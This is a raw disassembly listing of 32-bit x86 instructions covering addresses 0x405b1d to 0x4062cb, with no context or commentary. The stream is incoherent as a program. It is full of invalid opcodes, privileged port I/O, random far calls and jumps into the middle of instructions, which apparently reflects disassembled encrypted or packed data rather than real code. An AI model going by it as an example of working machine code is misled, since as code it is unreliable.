  405b1d:	bound  ecx,QWORD PTR [edi]
  405b1f:	jnp    0x405aa6
  405b21:	test   al,0xde
  405b23:	lods   eax,DWORD PTR ds:[esi]
  405b24:	xor    ebp,DWORD PTR [ebx+0x1e]
  405b27:	and    ecx,esp
  405b29:	lds    edi,FWORD PTR [esi]
  405b2b:	adc    DWORD PTR [edx],eax
  405b2d:	pop    ebp
  405b2e:	js     0x405afb
  405b30:	push   0xfffffff1
  405b32:	and    al,0x2f
  405b34:	shl    BYTE PTR [eax],0xeb
  405b37:	and    ah,BYTE PTR [ebx]
  405b39:	and    BYTE PTR [eax-0x32747f38],dl
  405b3f:	mov    BYTE PTR [edi-0x59622bf3],cl
  405b45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b46:	sbb    al,0x4e
  405b48:	mov    DWORD PTR [edi],edi
  405b4a:	push   ebp
  405b4b:	sub    eax,0xd0ec3001
  405b50:	fisttp WORD PTR [eax-0x27c3837]
  405b56:	add    eax,eax
  405b58:	test   eax,0x7771f3fe
  405b5d:	xor    BYTE PTR [ebx+0x44],bl
  405b60:	push   ebx
  405b61:	and    DWORD PTR [edi+0x61],edi
  405b64:	xor    esp,DWORD PTR [esi-0x4548a310]
  405b6a:	or     eax,0x8a33c69d
  405b6f:	push   ss
  405b70:	clc    
  405b71:	jne    0x405b60
  405b73:	in     eax,0xf4
  405b75:	push   esp
  405b76:	leave  
  405b77:	scas   eax,DWORD PTR es:[edi]
  405b78:	mov    ebp,DWORD PTR [eax+0x1]
  405b7b:	loop   0x405b01
  405b7d:	scas   al,BYTE PTR es:[edi]
  405b7e:	cmp    edi,DWORD PTR [ecx+0x3d]
  405b81:	rcl    BYTE PTR [eax-0x75],0xfa
  405b85:	adc    al,0x74
  405b87:	dec    esi
  405b88:	mov    bh,0x53
  405b8a:	arpl   WORD PTR [esp+ecx*2+0x58],bp
  405b8e:	call   0x5495:0x4926cc05
  405b95:	stc    
  405b96:	rcl    esp,cl
  405b98:	mov    eax,ds:0x2da0b68c
  405b9d:	dec    esi
  405b9e:	cmp    BYTE PTR [ecx+0x7f6d51c0],bh
  405ba4:	cmp    ah,BYTE PTR [esi-0x25]
  405ba7:	mov    al,0xa3
  405ba9:	jnp    0x405b82
  405bab:	es mov cl,bl
  405bae:	adc    eax,0x3582b07a
  405bb3:	dec    ecx
  405bb4:	out    dx,al
  405bb5:	mov    esi,0xcb8f50c2
  405bba:	sbb    DWORD PTR [eax+0x44fcedd1],eax
  405bc0:	cmp    BYTE PTR [eax+esi*4+0x46],0x56
  405bc5:	shr    DWORD PTR [eax-0x45b154c1],cl
  405bcb:	fld    TBYTE PTR ds:0xd323f98e
  405bd1:	add    bh,BYTE PTR [edx+eax*4]
  405bd4:	or     al,al
  405bd6:	mov    ebp,0x83b41131
  405bdb:	fcom   DWORD PTR ds:0x3c34cec7
  405be1:	mov    ah,BYTE PTR [eax]
  405be3:	lods   eax,DWORD PTR ds:[esi]
  405be4:	sub    al,0xd7
  405be6:	jmp    0x31cef760
  405beb:	mov    bl,0xcb
  405bed:	imul   ebx,DWORD PTR [ebx],0x24
  405bf0:	and    cl,BYTE PTR [ebp-0x54]
  405bf3:	xor    esp,DWORD PTR [edi]
  405bf5:	test   ebp,ecx
  405bf7:	dec    eax
  405bf8:	test   eax,0x647f9c41
  405bfd:	adc    DWORD PTR [esi+0x57],ebp
  405c00:	push   0x15
  405c02:	and    ch,ah
  405c04:	jbe    0x405b90
  405c06:	pop    esp
  405c07:	or     eax,0x3a3e6ada
  405c0c:	jmp    0x405c1a
  405c0e:	fdivr  DWORD PTR [ebp+0x562300bd]
  405c14:	adc    al,0xe
  405c16:	jne    0x405c62
  405c18:	rol    DWORD PTR [ebx-0x1],0xef
  405c1c:	ja     0x405c65
  405c1e:	cmc    
  405c1f:	mov    ah,0x9
  405c21:	(bad)  
  405c22:	aad    0xfe
  405c24:	pop    edx
  405c25:	les    ecx,FWORD PTR [edi+edi*4-0x21]
  405c29:	mov    dl,dh
  405c2b:	push   esi
  405c2c:	xor    ch,cl
  405c2e:	push   0x847f8b9f
  405c33:	sbb    eax,0xed8675c5
  405c38:	cmp    BYTE PTR [eax-0x2f],ah
  405c3b:	mov    ecx,0xde6e85e2
  405c40:	fwait
  405c41:	je     0x405c58
  405c43:	inc    esi
  405c44:	cmp    DWORD PTR [edi+0x4c],edx
  405c47:	sbb    edx,DWORD PTR [ebx-0x69]
  405c4a:	in     eax,0x87
  405c4c:	xchg   ecx,eax
  405c4d:	jmp    0xfb5ad081
  405c52:	or     DWORD PTR [eax+0x18878857],ebx
  405c58:	daa    
  405c59:	cmp    ebp,DWORD PTR [esi+eiz*1+0x271e7cf9]
  405c60:	stc    
  405c61:	jp     0x405c5f
  405c63:	ret    
  405c64:	mov    edx,DWORD PTR [ecx+0x21849ab5]
  405c6a:	imul   edx,DWORD PTR [esi-0x233bffe4],0x6e
  405c71:	adc    eax,0xbd88c1bc
  405c76:	cld    
  405c77:	gs aas 
  405c79:	imul   ecx,ebp,0x7bad8fec
  405c7f:	jmp    0x8e53da6f
  405c84:	sbb    al,BYTE PTR [ebx+0x6f]
  405c87:	jl     0x405c13
  405c89:	xchg   esp,eax
  405c8a:	out    dx,al
  405c8b:	je     0x405c2d
  405c8d:	push   ebx
  405c8e:	ss push ebp
  405c90:	imul   ebp,DWORD PTR [esi],0x1a80a06d
  405c96:	std    
  405c97:	adc    al,0xfd
  405c99:	pop    eax
  405c9a:	sbb    BYTE PTR [edi],0x71
  405c9d:	ja     0x405cf4
  405c9f:	es or  al,0x77
  405ca2:	rcl    DWORD PTR [edx],1
  405ca4:	hlt    
  405ca5:	addr16 rol ch,1
  405ca8:	sti    
  405ca9:	je     0x405c34
  405cab:	ins    BYTE PTR es:[edi],dx
  405cac:	and    bl,dl
  405cae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405caf:	cmc    
  405cb0:	stos   BYTE PTR es:[edi],al
  405cb1:	add    al,0x83
  405cb3:	outs   dx,DWORD PTR ds:[esi]
  405cb4:	fild   QWORD PTR [edi+0x40f0288]
  405cba:	mov    eax,0x415daab8
  405cbf:	xor    al,0x2a
  405cc1:	or     edi,ebx
  405cc3:	or     esi,DWORD PTR [esi]
  405cc5:	adc    BYTE PTR [eax],ah
  405cc7:	jno    0x405d03
  405cc9:	or     eax,edi
  405ccb:	clc    
  405ccc:	test   BYTE PTR [ecx+ecx*8-0xfb26747],bl
  405cd3:	dec    edi
  405cd4:	sub    eax,0x2ee7f4ac
  405cd9:	popa   
  405cda:	jnp    0x405cef
  405cdc:	popf   
  405cdd:	dec    edi
  405cde:	or     bl,bl
  405ce0:	imul   DWORD PTR [ebp+0x45999a92]
  405ce6:	cwde   
  405ce7:	nop
  405ce8:	test   BYTE PTR [esi-0x5ac61f2a],ah
  405cee:	mov    al,0x20
  405cf0:	loope  0x405d03
  405cf2:	xchg   ebx,eax
  405cf3:	push   ds
  405cf4:	push   eax
  405cf5:	add    BYTE PTR [ebx-0x2807edf8],0x5e
  405cfc:	outs   dx,DWORD PTR ds:[esi]
  405cfd:	stc    
  405cfe:	add    eax,0xce7c2f15
  405d03:	pushf  
  405d04:	mov    DWORD PTR [ebp+0x3bc857f1],esp
  405d0a:	push   ecx
  405d0b:	popf   
  405d0c:	(bad)  
  405d0d:	mov    esp,DWORD PTR [ecx-0xb]
  405d10:	retf   
  405d11:	ins    BYTE PTR es:[edi],dx
  405d12:	push   edi
  405d13:	stc    
  405d14:	lods   eax,DWORD PTR ds:[esi]
  405d15:	jbe    0x405d81
  405d17:	(bad)  
  405d18:	pusha  
  405d19:	imul   edx,DWORD PTR [edx],0xffffffec
  405d1c:	stc    
  405d1d:	push   ds
  405d1e:	sub    BYTE PTR [edx],al
  405d20:	int    0x2
  405d22:	mov    ds:0x1eb4bc0e,eax
  405d27:	add    al,0x60
  405d29:	add    al,0x96
  405d2b:	jl     0x405d35
  405d2d:	(bad)  
  405d2e:	mov    ecx,0x3effba8b
  405d33:	mov    ah,0x1f
  405d35:	inc    esi
  405d36:	lods   eax,DWORD PTR ds:[esi]
  405d37:	daa    
  405d38:	push   ds
  405d39:	leave  
  405d3a:	(bad)  
  405d3b:	xor    BYTE PTR [esp+ecx*4+0x32],bh
  405d3f:	enter  0x768b,0x12
  405d43:	retf   
  405d44:	dec    edx
  405d45:	push   0x1b
  405d47:	cmp    al,0xad
  405d49:	jecxz  0x405ccc
  405d4b:	mov    ah,0xe9
  405d4d:	xor    DWORD PTR [ebp+0x71],0xffffffab
  405d51:	push   edx
  405d52:	push   edi
  405d53:	mov    eax,ds:0x83f677c2
  405d58:	xchg   ebp,eax
  405d59:	shl    BYTE PTR [esi+0x5c],1
  405d5c:	jmp    0xbb20a30c
  405d61:	or     eax,0x61e4c32f
  405d66:	mov    eax,0x3e00ff07
  405d6b:	shr    DWORD PTR [ebp-0x75],cl
  405d6e:	test   al,0x3
  405d70:	pop    ecx
  405d71:	ret    
  405d72:	retf   
  405d73:	sub    al,0x63
  405d75:	pop    ss
  405d76:	mov    ch,0x7
  405d78:	aas    
  405d79:	jp     0x405d8c
  405d7b:	dec    eax
  405d7c:	inc    esp
  405d7d:	lods   al,BYTE PTR ds:[esi]
  405d7e:	mov    dl,BYTE PTR gs:[edx-0x1d]
  405d82:	pop    ds
  405d83:	xlat   BYTE PTR ds:[ebx]
  405d84:	arpl   WORD PTR [esi+0xd2649d7],dx
  405d8a:	jl     0x405da5
  405d8c:	ins    BYTE PTR es:[edi],dx
  405d8d:	push   ebp
  405d8e:	cmp    al,0xa1
  405d90:	xchg   esp,eax
  405d91:	pop    ss
  405d92:	push   ecx
  405d93:	or     eax,0x64deb081
  405d98:	fucomp st(5)
  405d9a:	in     eax,dx
  405d9b:	dec    ecx
  405d9c:	dec    esp
  405d9d:	adc    al,0x63
  405d9f:	imul   edi,DWORD PTR [esi],0xffffffd6
  405da2:	call   0x7bbe1a33
  405da7:	mov    ds:0x90563149,al
  405dac:	jmp    0x62b5295e
  405db1:	lock cmp al,0xab
  405db4:	push   ebx
  405db5:	push   ss
  405db6:	dec    edx
  405db7:	clc    
  405db8:	push   ebp
  405db9:	popf   
  405dba:	mov    DWORD PTR [ebx+0x16],esp
  405dbd:	jecxz  0x405e17
  405dbf:	cdq    
  405dc0:	fadd   QWORD PTR [edi-0x7f]
  405dc3:	nop
  405dc4:	pop    edi
  405dc5:	aad    0xc7
  405dc7:	xlat   BYTE PTR ds:[ebx]
  405dc8:	inc    esp
  405dc9:	(bad)  
  405dca:	or     dh,BYTE PTR [esi]
  405dcc:	rcl    BYTE PTR [ecx-0x38],cl
  405dcf:	push   0x611532f3
  405dd4:	scas   eax,DWORD PTR es:[edi]
  405dd5:	dec    ebp
  405dd6:	mov    BYTE PTR [ebp-0x58],bh
  405dd9:	(bad)  
  405dda:	and    DWORD PTR [ebp+0x6d],ebx
  405ddd:	sub    DWORD PTR [ebx-0x80],ebp
  405de0:	inc    edi
  405de1:	(bad)  
  405de2:	aad    0x68
  405de4:	in     eax,dx
  405de5:	mov    ah,0xcc
  405de7:	mov    ah,0xe2
  405de9:	mov    ds:0x3d9c2908,eax
  405dee:	cmp    BYTE PTR [ebx+edx*8-0x2cdf75cd],ch
  405df5:	xchg   esi,eax
  405df6:	dec    eax
  405df7:	mov    BYTE PTR [ebx+0x7c],ch
  405dfa:	add    al,0x3a
  405dfc:	(bad)  
  405dfd:	inc    DWORD PTR [ebx-0xac16d13]
  405e03:	int3   
  405e04:	clc    
  405e05:	fcmovbe st,st(2)
  405e07:	rcl    BYTE PTR [edi+0x4d328665],0x42
  405e0e:	sub    DWORD PTR [edx-0x63],0xd66a3bbb
  405e15:	shl    DWORD PTR [esi-0x7b],1
  405e18:	jmp    0x405de4
  405e1a:	cmp    al,0x4d
  405e1c:	fsubrp st(6),st
  405e1e:	jo     0x405e98
  405e20:	adc    cl,BYTE PTR [edx+0xfba3276]
  405e26:	jo     0x405e8a
  405e28:	ror    DWORD PTR gs:[esi+0x32],cl
  405e2c:	das    
  405e2d:	or     al,0x57
  405e2f:	cmp    dl,dl
  405e31:	push   0xbe52f7aa
  405e36:	cmc    
  405e37:	repnz mov ds:0xfe448804,eax
  405e3d:	xchg   ebx,eax
  405e3e:	repz or BYTE PTR [esi+0x37],bl
  405e42:	imul   ecx,DWORD PTR [eax],0xffffff84
  405e45:	or     al,BYTE PTR [eax-0x64a93338]
  405e4b:	dec    ecx
  405e4c:	pop    edx
  405e4d:	mul    DWORD PTR [edx-0x3484c561]
  405e53:	fstp   TBYTE PTR [esi]
  405e55:	mov    esi,0xda0053c7
  405e5a:	mov    ecx,esp
  405e5c:	jae    0x405ea0
  405e5e:	stos   BYTE PTR es:[edi],al
  405e5f:	ss not eax
  405e62:	xchg   ebx,eax
  405e63:	div    BYTE PTR [edx+0x2c998af6]
  405e69:	adc    DWORD PTR [edx],0x37ac1b9f
  405e6f:	dec    esi
  405e70:	xchg   eax,eax
  405e72:	jl     0x405eba
  405e74:	and    eax,DWORD PTR [esi]
  405e76:	inc    eax
  405e77:	shr    edi,1
  405e79:	inc    ebp
  405e7a:	and    ebx,edx
  405e7c:	jbe    0x405ea0
  405e7e:	push   esp
  405e7f:	(bad)  gs:[edx]
  405e82:	mov    cl,0x23
  405e84:	mov    bl,0x53
  405e86:	mov    dl,0xe
  405e88:	xchg   BYTE PTR [eax-0x57],al
  405e8b:	enter  0x74,0x8f
  405e8f:	(bad)  
  405e90:	push   ebx
  405e91:	lods   eax,DWORD PTR ds:[esi]
  405e92:	dec    edx
  405e93:	sbb    ah,BYTE PTR [edx+0x3f]
  405e96:	jl     0x405f04
  405e98:	int3   
  405e99:	jne    0x405eb7
  405e9b:	lock mov esp,0xacdf9712
  405ea1:	in     al,dx
  405ea2:	bswap  ebp
  405ea4:	pushf  
  405ea5:	loop   0x405ebb
  405ea7:	popf   
  405ea8:	sbb    BYTE PTR [ebp-0x49],ch
  405eab:	inc    esp
  405eac:	inc    ecx
  405ead:	inc    edi
  405eae:	sbb    BYTE PTR [ebx],dl
  405eb0:	fiadd  WORD PTR [edi]
  405eb2:	dec    ebx
  405eb3:	outs   dx,DWORD PTR ds:[esi]
  405eb4:	lods   al,BYTE PTR ds:[esi]
  405eb5:	mov    eax,0x15b60b33
  405eba:	jns    0x405eb2
  405ebc:	ret    
  405ebd:	out    dx,al
  405ebe:	cwde   
  405ebf:	xor    esi,DWORD PTR [eax-0x59]
  405ec2:	in     al,0xaf
  405ec4:	cdq    
  405ec5:	sub    al,0x42
  405ec7:	adc    BYTE PTR [eax+0x7b],al
  405eca:	pop    eax
  405ecb:	shl    BYTE PTR [edx+0x6deb3ee4],0xd9
  405ed2:	xchg   edx,eax
  405ed3:	pushf  
  405ed4:	pop    edx
  405ed5:	dec    esi
  405ed6:	push   es
  405ed7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ed8:	push   0xffffff8c
  405eda:	retf   
  405edb:	daa    
  405edc:	cmp    al,0x1e
  405ede:	mov    esp,0xc3104d04
  405ee3:	mov    esp,0xf46616f0
  405ee8:	movq   mm6,QWORD PTR [ecx]
  405eeb:	add    eax,0x5b3f1764
  405ef0:	ins    DWORD PTR es:[edi],dx
  405ef1:	fwait
  405ef2:	push   eax
  405ef3:	in     al,dx
  405ef4:	sbb    DWORD PTR [ecx-0x1f427a09],ecx
  405efa:	xor    bl,dl
  405efc:	(bad)  
  405efe:	bnd ds jmp 0x6381a390
  405f05:	sbb    eax,0x31aa27f5
  405f0a:	sbb    al,0xfc
  405f0c:	(bad)  
  405f0d:	xchg   edx,eax
  405f0e:	xchg   esi,eax
  405f0f:	mov    WORD PTR [eax-0x1b],?
  405f12:	pushf  
  405f13:	adc    eax,0x15af51fe
  405f18:	mov    eax,ds:0xe0cf8a54
  405f1d:	int    0xa0
  405f1f:	aad    0xab
  405f21:	inc    edi
  405f22:	rcr    BYTE PTR [ebx+eax*2],cl
  405f25:	mov    ebp,0x6e81bb16
  405f2a:	call   0x4f146de1
  405f2f:	sub    esp,ebp
  405f31:	mov    ds:0x2b190a31,eax
  405f36:	in     eax,dx
  405f37:	mov    edi,0xd0a21d6b
  405f3c:	mov    dh,0x15
  405f3e:	sbb    BYTE PTR [ecx],0x8e
  405f41:	call   0x44d:0xd7b6a47a
  405f48:	mov    ebp,0x996d6721
  405f4d:	aas    
  405f4e:	icebp  
  405f4f:	and    al,BYTE PTR [ebx+0x15]
  405f52:	loop   0x405fa6
  405f54:	xchg   BYTE PTR [ecx+0x19998b14],ah
  405f5a:	or     eax,0xbda4c8ee
  405f5f:	leave  
  405f60:	out    0x4f,eax
  405f62:	stc    
  405f63:	adc    edi,ebx
  405f65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f66:	xor    al,0xbf
  405f68:	mov    ch,0x4a
  405f6a:	pop    edi
  405f6b:	sahf   
  405f6c:	nop
  405f6d:	jns    0x405f26
  405f6f:	push   esi
  405f70:	mov    ch,0xcd
  405f72:	push   edx
  405f73:	mov    bh,0xaa
  405f75:	cmp    al,0x78
  405f77:	aad    0x68
  405f79:	cmp    cl,BYTE PTR [edx+eiz*2]
  405f7c:	shl    BYTE PTR [edi-0xd],cl
  405f7f:	fcom   DWORD PTR [ebx+eax*1]
  405f82:	add    al,ah
  405f84:	pop    ecx
  405f85:	sbb    BYTE PTR [edi],0xc3
  405f88:	and    al,BYTE PTR [esi+0x4f859c69]
  405f8e:	je     0x405f18
  405f90:	mov    ah,cl
  405f92:	sub    WORD PTR [edi-0x7b],di
  405f96:	push   ebx
  405f97:	pop    ebp
  405f98:	ds jno 0x406006
  405f9b:	inc    edi
  405f9c:	mov    esi,0x5aef43d1
  405fa1:	bound  ebp,QWORD PTR [ecx+0x4c]
  405fa4:	call   0x92af:0xa299f4d0
  405fab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fac:	test   BYTE PTR [edi+0x39],ch
  405faf:	or     eax,0x982b3468
  405fb4:	arpl   WORD PTR [eax-0x6f],dx
  405fb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405fb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fb9:	jle    0x405f73
  405fbb:	sbb    eax,0x9a8f0c8b
  405fc0:	push   0x58c6cf73
  405fc5:	add    eax,0xb65e6345
  405fca:	(bad)  
  405fcb:	das    
  405fcc:	test   al,0x83
  405fce:	mov    ?,ax
  405fd1:	inc    ecx
  405fd2:	xor    BYTE PTR ds:0x192e3e5e,bl
  405fd8:	fdivr  QWORD PTR [edi+0x45]
  405fdb:	ror    BYTE PTR [esi+edx*8-0x19],cl
  405fdf:	retf   0xc9
  405fe2:	pop    ebx
  405fe3:	sub    eax,0xcb335bfe
  405fe8:	loopne 0x406000
  405fea:	inc    edi
  405feb:	add    eax,0xbc55ad08
  405ff0:	lea    eax,[edx-0x29930260]
  405ff6:	inc    esi
  405ff7:	sbb    al,0xf9
  405ff9:	and    al,0x2f
  405ffb:	repnz sbb bh,BYTE PTR [eax+0x6]
  405fff:	jnp    0x405f86
  406001:	push   ebp
  406002:	fist   WORD PTR [eax+0x77afc92]
  406008:	xchg   ecx,eax
  406009:	fisubr DWORD PTR [ecx]
  40600b:	das    
  40600c:	pop    eax
  40600d:	jb     0x40608e
  40600f:	mov    al,0x44
  406011:	test   eax,0x6d330622
  406016:	rol    bh,cl
  406018:	lds    esi,FWORD PTR [ebx]
  40601a:	xchg   esp,eax
  40601b:	xor    al,0xeb
  40601d:	aas    
  40601e:	(bad)  
  40601f:	pop    esp
  406020:	pop    es
  406021:	loopne 0x405fd0
  406023:	xor    BYTE PTR [ebx-0x3e],bh
  406026:	test   DWORD PTR [ebx],edi
  406028:	outs   dx,BYTE PTR ds:[esi]
  406029:	pop    ebp
  40602a:	call   0xd6760b88
  40602f:	ins    BYTE PTR es:[edi],dx
  406030:	les    ebx,FWORD PTR [esi-0x3c6aad79]
  406036:	sub    eax,0x9f040fb2
  40603b:	fs sub al,0x49
  40603e:	mov    dh,0x5f
  406040:	(bad)  
  406041:	jle    0x40607c
  406043:	sbb    al,0x1b
  406045:	mov    bl,0xa
  406047:	xchg   ebp,eax
  406048:	jnp    0x4060b6
  40604a:	jp     0x406047
  40604c:	out    0x2f,al
  40604e:	gs ss stc 
  406051:	out    0x12,eax
  406053:	push   esp
  406054:	xchg   edi,eax
  406055:	pop    ebx
  406056:	repz adc eax,0xead455e9
  40605c:	adc    al,BYTE PTR [ecx-0x3bdd38e6]
  406062:	cmp    ch,bl
  406064:	fwait
  406065:	test   BYTE PTR [ebp+ecx*2+0x6],ah
  406069:	in     eax,dx
  40606a:	or     ecx,ebp
  40606c:	sbb    edx,DWORD PTR [edx+ebp*1]
  40606f:	add    esi,edx
  406071:	lods   al,BYTE PTR ds:[esi]
  406072:	push   eax
  406073:	adc    BYTE PTR [eax-0x596ed28e],cl
  406079:	mov    eax,0x4d6e9903
  40607e:	cmp    DWORD PTR [edi+0x1f1bcbc2],edx
  406084:	out    dx,al
  406085:	jb     0x406085
  406087:	(bad)  
  406088:	imul   ebp,DWORD PTR [edi],0x0
  40608b:	fldenv [eax]
  40608d:	je     0x406017
  40608f:	push   es
  406090:	cmp    eax,0x1c59d0c1
  406095:	sbb    ebx,esi
  406097:	jns    0x406103
  406099:	loope  0x406074
  40609b:	add    eax,0xaf9698a2
  4060a0:	or     al,0x9f
  4060a2:	fst    st(7)
  4060a4:	mov    esp,0xd4d03d06
  4060a9:	mov    esi,0x1eae9762
  4060ae:	xchg   ebx,eax
  4060af:	or     BYTE PTR [edx-0x4c902efe],dh
  4060b5:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4060b7:	cld    
  4060b8:	xchg   ebp,eax
  4060b9:	test   al,bl
  4060bb:	(bad)  
  4060bc:	dec    edi
  4060bd:	gs sbb eax,0x6e78983e
  4060c3:	retf   
  4060c4:	add    al,ah
  4060c6:	adc    edi,DWORD PTR [eax+0x3d81fb5d]
  4060cc:	test   BYTE PTR [edi+0x39],bl
  4060cf:	dec    ebx
  4060d0:	dec    esp
  4060d1:	stos   BYTE PTR es:[edi],al
  4060d2:	int    0x9f
  4060d4:	ins    DWORD PTR es:[edi],dx
  4060d5:	shl    BYTE PTR [esi],cl
  4060d7:	jnp    0x406095
  4060d9:	and    al,0x3b
  4060db:	inc    ecx
  4060dc:	ror    BYTE PTR [eax-0x7d81b760],1
  4060e2:	shl    BYTE PTR [ecx],1
  4060e4:	mov    ch,0xaf
  4060e6:	sbb    ebp,ebx
  4060e8:	cdq    
  4060e9:	enter  0xec58,0xeb
  4060ed:	xchg   ecx,eax
  4060ee:	fnstsw WORD PTR [esi]
  4060f0:	cmp    eax,0x7fd36b60
  4060f5:	xchg   ebx,eax
  4060f6:	mov    eax,0x69802468
  4060fb:	cmp    DWORD PTR [esi-0x7a8579a8],edx
  406101:	mov    dh,0xa3
  406103:	mov    al,ds:0x67cf092b
  406108:	mov    al,ds:0x53efb05d
  40610d:	and    esi,DWORD PTR [esi-0x4d]
  406110:	shl    DWORD PTR ds:0x66fee257,cl
  406116:	stos   BYTE PTR es:[edi],al
  406117:	ins    BYTE PTR es:[edi],dx
  406118:	jg     0x406135
  40611a:	pop    ebx
  40611b:	and    ecx,ecx
  40611d:	push   esi
  40611e:	(bad)  
  40611f:	fcomp  QWORD PTR fs:[esi-0x10]
  406123:	xchg   esi,eax
  406124:	and    eax,0x76a2a9fc
  406129:	mov    cl,0xcd
  40612b:	fnstsw WORD PTR [ebp-0x3e3121f6]
  406131:	xchg   edx,eax
  406132:	jge    0x406109
  406134:	sbb    eax,0x739ff2ef
  406139:	fldcw  WORD PTR ds:0x18856798
  40613f:	xchg   ebx,eax
  406140:	ds push edi
  406142:	cmp    eax,0x604c489c
  406147:	out    0x91,eax
  406149:	and    eax,0xb97b8818
  40614e:	mov    edi,0xcdd469ff
  406153:	jno    0x4060f3
  406155:	hlt    
  406156:	jo     0x4061c6
  406158:	cdq    
  406159:	or     eax,0x3edcc563
  40615e:	and    edi,DWORD PTR [ecx]
  406160:	cwde   
  406161:	enter  0x4429,0xcd
  406165:	add    BYTE PTR [ebx],ah
  406167:	jb     0x406126
  406169:	xchg   esi,eax
  40616a:	jmp    edi
  40616c:	mov    al,0xa8
  40616e:	mov    al,0x36
  406170:	add    esi,DWORD PTR [eax-0xa]
  406173:	into   
  406174:	lods   eax,DWORD PTR ds:[esi]
  406175:	push   edx
  406176:	ins    DWORD PTR es:[edi],dx
  406177:	in     al,0x60
  406179:	(bad)  
  40617a:	cld    
  40617b:	mov    ?,WORD PTR [ebp-0x51]
  40617e:	mov    bl,0xfc
  406180:	dec    ebp
  406181:	scas   eax,DWORD PTR es:[edi]
  406182:	pop    edx
  406183:	stc    
  406184:	sub    dl,BYTE PTR [edi-0x4b24d3f2]
  40618a:	scas   al,BYTE PTR es:[edi]
  40618b:	popf   
  40618c:	cmp    BYTE PTR [edx-0x1a],al
  40618f:	sbb    ecx,DWORD PTR [edx-0x3f]
  406192:	fdivr  DWORD PTR [eax]
  406194:	lods   al,BYTE PTR ds:[esi]
  406195:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406197:	cmp    DWORD PTR [edi],edx
  406199:	les    edx,FWORD PTR [eax-0x38]
  40619c:	sbb    DWORD PTR [edx-0x43],0x46
  4061a0:	push   ds
  4061a1:	hlt    
  4061a2:	lods   eax,DWORD PTR ds:[esi]
  4061a3:	ror    DWORD PTR [eax-0x13],cl
  4061a6:	dec    ecx
  4061a7:	cmp    al,BYTE PTR [ecx+0x38]
  4061aa:	rol    BYTE PTR [edx-0x2b],1
  4061ad:	mov    ds:0x71f26927,eax
  4061b2:	pop    ebx
  4061b3:	fistp  QWORD PTR ds:0x32f49baa
  4061b9:	or     eax,0xc1488a8e
  4061be:	push   edi
  4061bf:	into   
  4061c0:	xor    DWORD PTR [edx],0xffffff88
  4061c3:	scas   eax,DWORD PTR es:[edi]
  4061c4:	and    edx,DWORD PTR [edi+ebx*4]
  4061c7:	or     DWORD PTR [esi-0x106a981c],esp
  4061cd:	sbb    ah,BYTE PTR [ebp-0x37]
  4061d0:	int    0xd5
  4061d2:	jns    0x406160
  4061d4:	int    0xf2
  4061d6:	push   ecx
  4061d7:	jmp    0x406168
  4061d9:	pop    ss
  4061da:	pop    ss
  4061db:	add    eax,0x28a61dc1
  4061e0:	jbe    0x40623f
  4061e2:	adc    ah,ah
  4061e4:	ja     0x4061de
  4061e6:	mov    esi,0x6593ccf7
  4061eb:	xchg   ebx,eax
  4061ec:	aam    0x95
  4061ee:	loope  0x40626d
  4061f0:	adc    BYTE PTR [edx],bl
  4061f2:	xchg   BYTE PTR [eax+0x23],al
  4061f5:	pop    esi
  4061f6:	imul   esi,edx,0xb2b51f0c
  4061fc:	cli    
  4061fd:	dec    esi
  4061fe:	sub    eax,0x756452bf
  406203:	int3   
  406204:	push   edi
  406205:	mov    bh,BYTE PTR [edx]
  406207:	dec    edi
  406208:	test   al,ch
  40620a:	imul   ecx,DWORD PTR [edx-0x18c87a6],0xffffffe1
  406211:	jle    0x4061c9
  406213:	dec    esi
  406214:	xchg   BYTE PTR [edi+0xd],bh
  406217:	xor    ah,dl
  406219:	rcr    DWORD PTR [eax],1
  40621b:	push   eax
  40621c:	sbb    edi,DWORD PTR cs:[ebx+0x50]
  406220:	cld    
  406221:	cmp    dl,ch
  406223:	jo     0x4061ec
  406225:	call   0x1c7462fa
  40622a:	or     eax,0xc122c558
  40622f:	and    eax,0x42f02dff
  406234:	mov    edi,0xd5a01392
  406239:	sub    ebx,DWORD PTR [edi-0x6e]
  40623c:	pop    ds
  40623d:	jmp    0xd021:0x87d1be2
  406244:	cmp    al,0x8f
  406246:	hlt    
  406247:	mov    DWORD PTR [esi+0x2a],eax
  40624a:	bound  eax,QWORD PTR [eax]
  40624c:	cld    
  40624d:	dec    DWORD PTR [esi-0x727faa9]
  406253:	lahf   
  406254:	and    ch,cl
  406256:	mov    ebp,0x55fcc4c3
  40625b:	pop    esi
  40625c:	int    0x99
  40625e:	inc    ecx
  40625f:	inc    ebp
  406260:	mov    ecx,0x67ebaad1
  406265:	sar    BYTE PTR [ecx-0x3d],0x9b
  406269:	mov    al,ds:0x70de194
  40626e:	xchg   esi,eax
  40626f:	mov    al,0x29
  406271:	xor    al,0x8c
  406273:	dec    esp
  406274:	dec    DWORD PTR [ebx]
  406276:	adc    al,0xe9
  406278:	imul   ebx,ebx,0x22558de2
  40627e:	loope  0x4062f4
  406280:	push   esi
  406281:	call   0x89ade7b8
  406286:	inc    edx
  406287:	cmp    eax,ecx
  406289:	mov    cl,0x38
  40628b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40628c:	cs scas al,BYTE PTR es:[edi]
  40628e:	ret    
  40628f:	outs   dx,BYTE PTR ds:[esi]
  406290:	mov    esp,0xde8663f0
  406295:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406296:	or     ah,BYTE PTR [edx+eiz*1]
  406299:	fwait
  40629a:	cs repz or dh,dh
  40629e:	clc    
  40629f:	sub    dl,al
  4062a1:	xor    ebp,DWORD PTR [esi+eiz*4+0x18746d6a]
  4062a8:	and    DWORD PTR [ebx+0x7a49e7ef],0x37
  4062af:	fcom   st(1)
  4062b1:	mov    eax,ds:0x45cddc52
  4062b6:	pusha  
  4062b7:	call   0x3191:0xd7c859bd
  4062be:	sar    cl,0x13
  4062c1:	inc    edx
  4062c2:	hlt    
  4062c3:	sub    al,0x0
  4062c5:	push   es
  4062c6:	sbb    DWORD PTR [edi],ecx
  4062c8:	in     eax,dx
  4062c9:	xor    ch,bl
  4062cb:	xchg   dl,ch
